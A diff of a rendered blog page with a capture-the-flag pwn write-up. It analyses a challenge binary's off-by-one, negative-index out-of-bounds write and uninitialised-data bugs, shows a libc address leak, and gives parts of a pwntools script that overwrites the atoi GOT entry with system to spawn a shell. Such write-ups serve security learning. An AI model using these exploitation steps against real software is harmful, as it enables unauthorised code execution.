+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">num</span> <span class="o">&gt;</span> <span class="mi">1</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">log_message</span><span class="p">(</span><span class="mi">3LL</span><span class="p">,</span> <span class="s">&#34;Invalid role.&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="p">((</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">curr_user</span> <span class="o">+</span> <span class="mi">64</span><span class="p">)</span> <span class="o">=</span> <span class="n">num</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">log_message</span><span class="p">(</span><span class="mi">0LL</span><span class="p">,</span> <span class="s">&#34;New role has been set successfully!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>This menu can only be used by <code>captain</code>, where the <code>captain</code> is allowed to change its role.</p>
+<p>Now that we have analyze the available functions, this is the summary of our findings:</p>
+<ul>
+<li>There is a bug in <code>user_edit</code>, where if you put <code>n</code> with <code>256</code>, it will actually nullify the byte resides in <code>curr_user+0x100</code>, which is <code>role</code>. Nullify mean setting it to <code>0</code>, which mean the user itself will be converted to <code>captain</code> even before entering the <code>menu</code> method.</li>
+<li>There is a bug in <code>configure_engine</code>, where you can use negative index to do OOB Write for addresses before the address of <code>engine</code>.</li>
+<li>There is a bug as well in <code>change_route</code>, where you can trigger UDA and set it to the <code>route</code> entry. Combined with <code>view_route</code>, we can print the UDA value whichh has been copied to here.</li>
+</ul>
+<p>Based on those three bugs, we need to figure out how to gain a shell.</p>
 <h3 id="solution-4">Solution</h3>
+<h4 id="leaking-libc-address">Leaking libc address</h4>
+<p>To gain a shell, we need to get a leak of the libc address. Based on the above bugs, the only possible path to get a libc leak is by trigering the UDA bug, with hope that the UDA is a libc address. After trying this method, turn out we&rsquo;re lucky enough because the UDA value is indeed a libc address. Below is the proof</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[*] Current Role: Captain
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Option [1-5]: 4
+</span></span><span class="line"><span class="cl">selection: 4
+</span></span><span class="line"><span class="cl">&lt;===[ Route ]===&gt;
+</span></span><span class="line"><span class="cl">&lt;===[ Coordinates [1] ]===&gt;
+</span></span><span class="line"><span class="cl">	Latitude  : 140542399197248
+</span></span><span class="line"><span class="cl">	Longitude : 140542396966484
+</span></span><span class="line"><span class="cl">&lt;===[ Coordinates [2] ]===&gt;
+</span></span><span class="line"><span class="cl">	Latitude  : 0
+</span></span><span class="line"><span class="cl">	Longitude : 4199857
+</span></span><span class="line"><span class="cl">&lt;===[ Coordinates [3] ]===&gt;
+</span></span><span class="line"><span class="cl">	Latitude  : 11214159609856
+</span></span><span class="line"><span class="cl">	Longitude : 3333855601743636224
+</span></span><span class="line"><span class="cl">&lt;===[ Coordinates [4] ]===&gt;
+</span></span><span class="line"><span class="cl">	Latitude  : 140726594745344
+</span></span><span class="line"><span class="cl">	Longitude : 4199934
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>As you can see, the first coordinate longitude is indeed a libc address if you convert it to hex.</p>
+<h4 id="gain-remote-code-execution-1">Gain Remote Code Execution</h4>
+<p>Now that we have the libc leak, we can switch our role to <code>technician</code>, and then trigger a OOB write with negative index. Our target is to overwrite the <code>atoi</code> GOT to <code>system</code>. After that, we can simply input <code>sh</code> during the <code>read_option</code> call in menu, and because the read option is using <code>atoi</code>, it will trigger <code>system(&quot;sh&quot;)</code>, which will give us a shell.</p>
+<h4 id="full-script-4">Full Script</h4>
 <p>Below is my full script:</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -1280,6 +2665,7 @@
 </span><span class="lnt">75
 </span><span class="lnt">76
 </span><span class="lnt">77
+</span><span class="lnt">78
 </span></code></pre></td>
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
@@ -1330,6 +2716,7 @@
 </span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">thrust</span><span class="p">,</span> <span class="n">mixture</span>
 </span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;y&#39;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Trigger the off-by-one bug</span>
 </span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x100</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;n&#39;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;256&#39;</span><span class="p">)</span>
@@ -1357,7 +2744,7 @@
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="c1"># Change atoi to system</span>
 </span></span><span class="line"><span class="cl"><span class="n">configure_engine</span><span class="p">((</span><span class="n">exe</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;atoi&#39;</span><span class="p">]</span><span class="o">-</span><span class="n">engines_addr</span><span class="p">)</span> <span class="o">//</span> <span class="mh">0x10</span><span class="p">,</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="o">.</span><span class="n">system</span><span class="p">,</span> <span class="mh">0x401150</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;sh&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;sh&#39;</span><span class="p">)</span> <span class="c1"># Trigger a shell</span>
 </span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 </span></span></code></pre></td></tr></table>
 </div>
